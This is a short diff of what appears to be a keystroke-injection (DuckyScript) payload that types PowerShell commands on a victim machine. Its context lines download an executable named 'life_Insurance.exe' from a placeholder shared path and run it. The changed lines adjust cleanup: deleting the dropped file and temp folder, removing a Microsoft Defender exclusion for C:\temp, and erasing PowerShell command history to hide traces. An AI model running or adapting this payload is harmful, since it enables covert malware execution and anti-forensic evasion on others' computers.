@@ -15,10 +15,10 @@ ENTER
 STRING $down = New-Object System.Net.WebClient; $url = '%SHARED_DRIVE%'; $file = 'life_Insurance.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);
 ENTER
 DELAY 1500
-STRING cd .. ; rm -r temp
+STRING rm life_Insurance.exe ; cd ..
 ENTER
 DELAY 500
-STRING Remove-MpPreference -ExclusionPath "C:\temp" ; Remove-Item (Get-PSreadlineOption).HistorySavePath
+STRING Remove-MpPreference -ExclusionPath "C:\temp" ; rm -r temp ; Remove-Item (Get-PSreadlineOption).HistorySavePath
 ENTER
 DELAY 500
 STRING exit
